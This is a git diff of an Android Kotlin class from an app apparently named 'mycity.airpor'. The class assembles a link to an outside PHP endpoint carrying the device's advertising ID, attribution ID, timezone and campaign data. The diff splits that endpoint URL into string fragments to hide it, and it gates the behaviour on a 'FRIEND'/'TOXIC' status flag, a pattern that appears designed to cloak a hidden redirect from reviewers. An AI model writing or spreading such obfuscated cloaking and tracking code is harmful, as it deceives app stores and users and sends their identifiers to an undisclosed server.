@@ -1,7 +1,10 @@
 package mycity.airpor.data
 
 import android.content.Context
+import android.util.Log
 import io.paperdb.Paper
+import mycity.airpor.App
+import mycity.airpor.MainActivity
 import java.util.TimeZone
 
 class DataChecker(private val context: Context) {
@@ -9,6 +12,8 @@ class DataChecker(private val context: Context) {
     val apps = Apps()
     val face = Face()
     val google = Google()
+    val sp = context.getSharedPreferences(App.FB_ID, Context.MODE_PRIVATE)
+    val currentStatus = sp.getString(App.ONE_SIGNAL, "") ?: ""
 
     suspend fun initialProcess(){
 
@@ -19,21 +24,26 @@ class DataChecker(private val context: Context) {
 
         val jazz = appsMap?.get("campaign").toString()
 
-
-        if (facebook != "null"){
-            fbSaver(facebook, google, appsUid)
-        } else {
-            if (jazz != "null"){
-                appsSaver(appsMap,appsUid, google, 34)
+        if (currentStatus != App.TOXIC){
+            if (facebook != "null"){
+                fbSaver(facebook, google, appsUid)
             } else {
-                saveNature(google, jazz, 2, 44, 15, appsUid)
+                if (jazz != "null"){
+                    appsSaver(appsMap,appsUid, google, 34)
+                } else {
+                    saveNature(google, jazz, 2, 44, 15, appsUid)
+                }
             }
+        } else {
+            MainActivity.transmitter.emit(App.TOXIC)
         }
-
     }
 
-    private fun saveNature(google: String, jazz: String, one: Int, two: Int, three: Int, appsUID: String){
-        val destination = "$baseUrl$secure_get_parametr$secure_key"
+    private suspend fun saveNature(google: String, jazz: String, one: Int, two: Int, three: Int, appsUID: String){
+
+        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]
+
+        val destination = "$olaola$secure_get_parametr$secure_key"
         val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
         val destination3 = "${deeplink_key}null&${source_key}null&"
         val destination4 = "${af_id_key}${appsUID}&${adgroup_key}null&"
@@ -42,18 +52,25 @@ class DataChecker(private val context: Context) {
 
         val final = destination+destination2+destination3+destination4+destination5+destination6
 
-        Paper.book().write("link", final)
+        Log.d("123123", "saveNature final is $final")
 
+        println(jazz+one+two+three)
+
+        Paper.book().write("link", final)
+        MainActivity.transmitter.emit(App.FRIEND)
+        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()
 
     }
 
-    private fun appsSaver(
+    private suspend fun appsSaver(
         appsMap: MutableMap<String, Any>?,
         appsUid: String,
         google: String,
         num: Int
     ) {
-        val destination = "$baseUrl$secure_get_parametr$secure_key"
+        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]
+
+        val destination = "$olaola$secure_get_parametr$secure_key"
         val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
         val destination3 = "${deeplink_key}null&${source_key}${appsMap?.get("media_source").toString()}&"
         val destination4 = "${af_id_key}${appsUid}&${adgroup_key}${appsMap?.get("adgroup").toString()}&"
@@ -62,14 +79,20 @@ class DataChecker(private val context: Context) {
         println(num)
 
         val final = destination+destination2+destination3+destination4+destination5+destination6
+        Log.d("123123", "appsSaver final is $final")
 
         Paper.book().write("link", final)
+        MainActivity.transmitter.emit(App.FRIEND)
+        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()
+
     }
 
-    private fun fbSaver(fb: String, google: String, appsUID: String){
+    private suspend fun fbSaver(fb: String, google: String, appsUID: String){
+
+        val olaola = baseUrl[0]+baseUrl[1]+baseUrl[2]+baseUrl[3]+baseUrl[4]+baseUrl[5]+baseUrl[6]+baseUrl[7]+baseUrl[8]
 
 
-        val destination = "$baseUrl$secure_get_parametr$secure_key"
+        val destination = "$olaola$secure_get_parametr$secure_key"
         val destination2 = "$dev_tmz_key$timezone&$gadid_key$google&"
         val destination3 = "$deeplink_key$fb&${source_key}deeplink&"
         val destination4 = "${af_id_key}${appsUID}&${adgroup_key}null&"
@@ -78,12 +101,16 @@ class DataChecker(private val context: Context) {
 
         val final = destination+destination2+destination3+destination4+destination5+destination6
 
-        Paper.book().write("link", final)
+        Log.d("123123", "fbSaver final is $final")
 
+
+        Paper.book().write("link", final)
+        MainActivity.transmitter.emit(App.FRIEND)
+        sp.edit().putString(App.ONE_SIGNAL, App.FRIEND).apply()
     }
 
     companion object{
-        val baseUrl = "https://unexploredgiza.xyz/giza.php?"
+        val baseUrl = listOf("ht", "tps", "://u", "nexp", "lore", "dgiz", "a.xyz/", "giza", ".php?")
         val secure_get_parametr = "4i7e18xxh0="
         val secure_key = "61s14cbgla&"
         val dev_tmz_key = "ccwqhcwqvm="
